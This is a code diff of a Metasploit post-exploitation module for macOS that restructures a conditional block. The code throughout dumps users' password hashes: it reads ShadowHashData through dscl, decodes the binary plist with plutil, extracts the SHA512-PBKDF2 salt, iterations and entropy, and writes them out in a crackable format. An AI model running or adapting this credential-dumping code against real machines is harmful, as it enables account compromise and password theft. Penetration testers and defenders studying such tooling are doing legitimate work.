@@ -82,34 +82,31 @@ class Metasploit3 < Msf::Post
       next if datastore['MATCHUSER'].blank? or datastore['MATCHUSER'] !~ user
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
-        # Look for the user's specific profile.plist, which contains ShadowHashData key
         shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
         next unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
         # strip the other bytes
         shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
-        if not lion? # 10.8
-          # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
-          # SHA512PBKDF2 is used for encrypting.
-          # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
-          plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
-          # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
-          shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")
-          # read the plaintext xml
-          shadow_xml = REXML::Document.new(shadow_plist)
-          # parse out the different parts of sha512pbkdf2
-          dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
-          entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
-          iterations = dict.elements[4].text.gsub(/\s+/, '')
-          salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
-          # Report the hash bytes
-          vprint_good "SHA512PBKDF2:entropy:#{user}:#{entropy}"
-          vprint_good "SHA512PBKDF2:iterations:#{user}:#{iterations}"
-          vprint_good "SHA512PBKDF2:salt:#{user}:#{salt}"
-          # PBKDF2 stored in <user, iterations, salt, entropy> format
-          decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
-          print_good "SHA512:#{decoded_hash}"
-          hash_file << decoded_hash
-        end
+        # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
+        # SHA512PBKDF2 is used for encrypting.
+        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
+        plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+        # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
+        shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")
+        # read the plaintext xml
+        shadow_xml = REXML::Document.new(shadow_plist)
+        # parse out the different parts of sha512pbkdf2
+        dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
+        entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
+        iterations = dict.elements[4].text.gsub(/\s+/, '')
+        salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
+        # Report the hash bytes
+        vprint_good "SHA512PBKDF2:entropy:#{user}:#{entropy}"
+        vprint_good "SHA512PBKDF2:iterations:#{user}:#{iterations}"
+        vprint_good "SHA512PBKDF2:salt:#{user}:#{salt}"
+        # PBKDF2 stored in <user, iterations, salt, entropy> format
+        decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
+        print_good "SHA512:#{decoded_hash}"
+        hash_file << decoded_hash
       elsif lion? # 10.7
         # on 10.7 the ShadowHashData is stored in plaintext
         hash_decoded = shadow_bytes.upcase
